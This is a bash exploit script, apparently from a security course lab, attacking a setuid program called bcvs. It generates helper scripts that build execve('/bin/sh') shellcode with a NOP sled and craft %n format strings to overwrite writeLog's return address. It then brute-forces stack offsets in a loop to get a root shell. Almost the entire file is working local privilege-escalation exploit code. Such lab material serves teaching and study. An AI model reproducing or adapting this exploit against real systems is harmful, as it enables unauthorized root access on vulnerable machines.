#!/bin/bash

## ---------------------- Description ------------------------ ##
## This sploit inserts shellcode into the log buffer in
## main and then uses the printf vulnerability in writeLog
## to overwite the return pointer to go to this code.
## ----------------------------------------------------------- ##

## Note: Since this exploit and sploit1 don't depend on faking the block.list
## they should be removed eventually. This is just to allow us to execute them
## from the repo
rm -rf sploit2_dir
mkdir -p sploit2_dir
cd sploit2_dir
mkdir -p .bcvs
touch .bcvs/block.list

# ------------------- Create Scripts ------------------- #
cat <<EOS > "payload.py"
#!/usr/bin/python

import sys

bsize = 240
NOP="\x90"

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"


if __name__ == '__main__':
  if len(sys.argv) > 1:
    bsize = int(sys.argv[1])

  if bsize < len(shellcode):
    print("Your buffer size should be at least as long as the shellcode: {}".format(len(shellcode)))
    sys.exit(-1)

  full_shellcode = NOP * (bsize - len(shellcode) - 1)
  full_shellcode += shellcode
  print(full_shellcode)
  sys.exit(0)
EOS

rm -f gen_fmt_str.py
cat <<EOS > "gen_fmt_str.py"
#!/usr/bin/python

import sys

# ------------------------ Script Description ---------------------- #
# This script generates the attack string to be entered into printf.
# Args:
#   ret_ptr_addr - Address where the return pointer sits on the stack.
#                 This is the address where you want to insert the next
#                 argument.
#
#   retr_ptr_val - The value you want to write at ehe ret_ptr_addr.

def hexify(num):
  num = "%x" % (num)

  if len(num) % 2:
    num = '0'+num

  return num.decode('hex')

def hasTermByte(addr):
  for b in addr:
    if b == '\x0A' or b == '\xFF':
      return True

  return False

def fillInitialAddress(fstr, addr,  direction=1):

  # We first need 2 bytes of padding because the '.bcvs/' at the beginning
  # of log is going to throw us off the word boundary
  fstr += "\x01\x01"

  # Create a list of addresses, incremented by 'direction'
  addr_list = [hexify(addr+(direction*i))[::-1] for i in range(4)]
  for a in addr_list:
    # If the addresses we are writing here have null bytes we may need to
    # redo the rewrite technique from earlier. Since the stack is ~always~
    # aligned to a 16 byte boundary not ending with 00 then we shouldn't
    # have problems
    fstr += a

  return fstr

def findRequiredOffset(targetByte, cWritten):
  """Say you want to write 'targetByte' and so far you have currently
  written cWritten bytes. If you call this function with that info you
  will get back an offset for the next %{}x directive. Remember that
  since the offset is always increasing you will have wraparound from
  the desired byte but if you are writing correctly (increasing address)
  this shouldn't be a problem"""
  int_repr = byteStrToInt(targetByte)
  diff = 0
  while diff < 8:
    diff = int_repr - cWritten
    int_repr += 256

  return diff

def fillReturnPointerValue(fstr, targetRetAddr, offset):
  # This is the address in memory that the fprintf attack ultimately
  # wants to make writeLog return to. The addresses to write this address
  # to have already been setup we just need to create the correct
  # fprintf directives to write the bytes we want
  targetRetAddr = targetRetAddr[::-1]

  # Since the addresses are going on elsewhere on the stack and aren't part
  # of the format string we don't count them in the bytes written
  #written = len(fstr)
  written = 0

  # The direct parameter access offset. I assume that if a word is 4 bytes
  # then if we really want to access the first 'argument' we need to use
  # direct parameter access for variable offset/4
  dpa_offset = offset / 4

  # Now this portion of the format string will use the addrs in main's 'log'
  # to overwrite writeLog's return address to be targetRetAddr
  for i in range(4):
    # What padding do we need for the %x directive in order to write the
    # desired byte?
    diff = findRequiredOffset(targetRetAddr[i], written)
    fstr += "%{}x%{}\$n".format(diff, dpa_offset);
    #print("fstr = {}".format(fstr))
    written += diff
    dpa_offset += 1

  # The format string should be all done and ready to go
  return fstr

def byteStrToInt(s):
  return int(s.encode('hex'), 16)

def usage():
  print("Usage: {} <ret ptr addr> <ret ptr value> <heap base> [offset]".format(sys.argv[0]))


def padByteString(s):
  s = "0"*(8 - len(s)) + s
  return s

if __name__ == '__main__':
  if len(sys.argv) < 3:
    usage()
    sys.exit(1)

  rptr_offset = 0
  if len(sys.argv) > 3:
    rptr_offset = int(sys.argv[4])

  # Some input checking
  sys.argv[1] = padByteString(sys.argv[1])
  sys.argv[2] = padByteString(sys.argv[2])

  rptr_addr = sys.argv[1].decode('hex')
  rptr_val = sys.argv[2].decode('hex')
  rptr_addr_int = int(sys.argv[1], 16) - rptr_offset

  # This is the offset above the printf call to find the start of the
  # format string itself so we can access the addresses.
  #
  # So I've got a bit of a problem. Since the format string isn't stored
  # on the stack we cannot use the conventional method to read the memory
  # addresses stored there. Instead I'm going to insert the addresses in
  # the log buffer of main and read them from there like they were right
  # above printf's stack.
  #
  # After some trial and error I found that the return address for main is
  # 91 words (364 bytes) above printf's stack frame. The start of log however
  # is 18 words up (72 bytes) which is where we are concerned. It is actually
  # 19 above but printf knows to skip its return address when reading
  # variables (duh).
  init_fprintf_offset = 18 * 4
  init_fprintf_offset += 8  # (for the '.bcvs/' and the 2 padding bytes)

  format_str = ""
  format_str = fillInitialAddress(format_str, rptr_addr_int, 1)
  format_str = fillReturnPointerValue(format_str, rptr_val, init_fprintf_offset)

  print("{}".format(format_str))
  sys.exit(0)
EOS

cat <<EOS > "rerun_sploit.sh"
#!/bin/bash
cd ..
./sploit2.sh $1
cd sploit2_dir
EOS

cat <<EOS > "run_w_gdb.sh"
#!/bin/bash
ATTACK_JMP_ADDR="804C3A8"
FORMAT_ADDRS_LEN=18

SHELLCODE=\$(./payload.py 200)
FORMAT_STR=\$(./gen_fmt_str.py bffff61C \$ATTACK_JMP_ADDR)
FORMAT_ADDRS=\${FORMAT_STR:0:\$FORMAT_ADDRS_LEN}
FORMAT_DIRS=\${FORMAT_STR:\$FORMAT_ADDRS_LEN}
echo "Shellcode: \$SHELLCODE"
echo "Format String: \$FORMAT_STR"

touch temp_file_gdb

echo "\${FORMAT_DIRS}\${SHELLCODE}" > format_str
gdb -ex "set args ci \"\$FORMAT_ADDRS\" < format_str" /opt/bcvs/bcvs
EOS

chmod +x payload.py
chmod +x gen_fmt_str.py
chmod +x rerun_sploit.sh
chmod +x run_w_gdb.sh

if [[ $# -gt 0 && $1 == "-s" ]]; then
  # This way we can update the scripts without running the exploit
  echo "Skipping actual exploit. Scripts should be updated."
  exit 0
fi

SHELLCODE=`./payload.py 200`

if [[ $? == -1 ]]; then
  echo "failed to generate shellcode"
  exit -1
fi
echo "Created shellcode of length: ${#SHELLCODE}"

touch temp_file

OFFSET=0
RET_PTR_LOC="bffff62C"  # The frame for writeLog shouldn't come before this
ATTACK_JMP_ADDR="804C3A8"  # This is 0xD0 bytes into the heap buffer

# Now that we store the address part of the format string on the stack in main
# this is no longer necessary
HEAP_PTR="804c2d8" # Given we don't have ASLR enabled this seems to be consistent

FORMAT_ADDRS_LEN=18  # How many bytes at the beginning of the format string are for the addrs

# Now we brute force it. Hopefully if our initial guess isn't too far off we
# should get it soon.
while [[ $OFFSET -lt 100 ]]; do 
  _OFFSET=$(( $OFFSET * 16 ))
  echo "Generating format string [base,offset]: [$RET_PTR_LOC,$_OFFSET]"
  FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET`
  FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
  FORMAT_DIRS=${FORMAT_STR:$FORMAT_ADDRS_LEN}  # These are the format directives

  if [[ $? != "0" ]]; then
    echo "Failed to generate format string"
    exit -1
  fi

  echo "Format String (hex):"
  echo  $FORMAT_STR | hexdump -C

  echo "Format String Addrs: ${FORMAT_ADDRS}"
  echo "Format Directives: ${FORMAT_DIRS}"

  # This file will usually stay the same but incase something changes
  # later we will just recreate it
  #mkdir -p "$FORMAT_ADDRS"
  touch "$FORMAT_ADDRS"

  echo "${FORMAT_DIRS}${SHELLCODE}" | /opt/bcvs/bcvs ci "$FORMAT_ADDRS"

  OFFSET=$(( $OFFSET + 1 ))
done

rm -rf "$FORMAT_ADDRS"

echo "If you didn't get a root shell then we failed... :("
